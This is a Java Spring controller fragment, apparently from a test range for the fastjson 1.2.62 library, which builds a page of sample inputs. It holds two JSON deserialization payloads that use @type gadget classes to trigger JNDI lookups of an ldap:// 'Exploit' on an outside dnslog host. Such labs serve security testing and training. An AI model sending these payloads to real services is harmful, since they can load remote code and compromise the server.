...
public class FastjsonController {
    ...
    @GetMapping(value = {"/", "/fastjson-1.2.62"}, produces = "text/html;charset=UTF-8")
    @ResponseBody
    public String index() {
        return buildPage("fastjson-1.2.62 靶场测试页", "/fastjson1.2.62-process", new String[]{
                "{\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"AsText\":\"ldap://fastjson1.2.62-process.dnslog.cn/Exploit\"}",
                "{\"@type\":\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\",\"properties\": {\"@type\":\"java.util.Properties\",\"UserTransaction\":\"ldap://fastjson1.2.62-process.dnslog.cn/Exploit\"}}"
